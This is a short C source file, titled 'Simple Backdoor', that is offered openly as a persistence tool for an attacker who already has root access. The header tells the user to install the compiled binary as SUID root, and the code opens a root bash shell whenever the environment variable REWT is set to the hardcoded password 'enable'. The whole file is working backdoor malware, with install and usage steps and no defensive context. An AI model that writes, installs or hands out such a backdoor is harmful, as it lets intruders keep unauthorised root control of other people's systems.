/************************************************
*												*
* Simple Backdoor								*
* ~ by Acidburn									*
*												*
* Use case:										*
*       You have already gained root access and	*
*		you want to maintain access				*
*												*
* Install:										*
*       Compile and then place the binary in a	*
*		folder that is accessible by a regular	*
*		user									*
*		Binary should be owned by root and be	*
*		SUID (chmod 4755)						*
*												*
* Usage:										*
*		To gain root access, simply run the		*
*		following command then run the program:	*
*		export REWT=enable						*
*												*
* Outcome:										*
*		Should spawn a root shell				*
*												*
*************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* The backdoor password */
#define PASSWORD "enable"

int main() {

	/* Check password */
	if (getenv("REWT") != NULL) {
		if (!strcmp(getenv("REWT"), PASSWORD)) {
	
	    	printf("[+] Correct Password\n");

			printf("[+] Current Privileges: UID=%d EUID=%d GID=%d EGID=%d\n",
					getuid(), geteuid(), getgid(), getegid());
	
			/* Elevate Privileges */
			printf("[+] Elevating Privileges ...\n");
			setuid(0);
			setgid(0);

			printf("[+] Current Privileges: UID=%d EUID=%d GID=%d EGID=%d\n",
			getuid(), geteuid(), getgid(), getegid());

			/* Spawn  bash shell */
			printf("[+] Spawning Bash Shell\n");
			execl("/bin/bash", "bash", NULL);
		}
	}
	return 0;
}
